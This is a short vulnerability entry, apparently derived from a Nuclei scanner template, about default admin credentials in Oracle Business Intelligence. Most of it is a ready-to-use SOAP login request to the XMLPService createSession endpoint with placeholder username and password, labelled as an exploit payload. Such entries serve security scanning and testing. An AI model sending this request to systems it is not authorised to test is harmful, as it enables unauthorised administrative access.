# Vulnerability: Oracle Business Intelligence Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`businessintelligence-default-login.yaml`)

## Description
Oracle Business Intelligence default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /xmlpserver/services/XMLPService HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml
SOAPAction: ""
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:rep="http://xmlns.oracle.com/oxp/service/report">
   <soapenv:Header/>
   <soapenv:Body>
      <rep:createSession soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <username xsi:type="xsd:string">{{username}}</username>
         <password xsi:type="xsd:string">{{password}}</password>
         <domain xsi:type="xsd:string">bi</domain>
      </rep:createSession>
   </soapenv:Body>
</soapenv:Envelope>
```

